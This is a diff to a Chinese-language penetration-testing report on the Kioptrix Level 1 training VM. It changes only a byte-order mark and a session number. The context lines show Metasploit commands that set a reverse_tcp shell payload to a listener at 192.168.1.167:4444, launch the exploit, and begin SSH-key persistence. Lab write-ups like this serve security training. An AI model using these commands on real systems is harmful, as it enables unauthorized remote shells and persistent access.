@@ -1,4 +1,4 @@
-﻿# Kioptrix Level 1 渗透测试完整报告
+﻿﻿# Kioptrix Level 1 渗透测试完整报告
 
 > **靶机信息**
 > - 名称：Kioptrix Level 1
@@ -513,7 +513,7 @@ set payload linux/x86/shell/reverse_tcp    # 设置载荷
 set LHOST 192.168.1.167                    # 设置监听 IP
 set LPORT 4444                             # 设置监听端口
 exploit                                    # 执行攻击
-sessions -i 1                              # 进入会话
+sessions -i 2                              # 进入会话
 
 # ========== 权限维持 ==========
 ssh-keygen -t rsa -f ~/.ssh/id_rsa_kioptrix  # 生成密钥
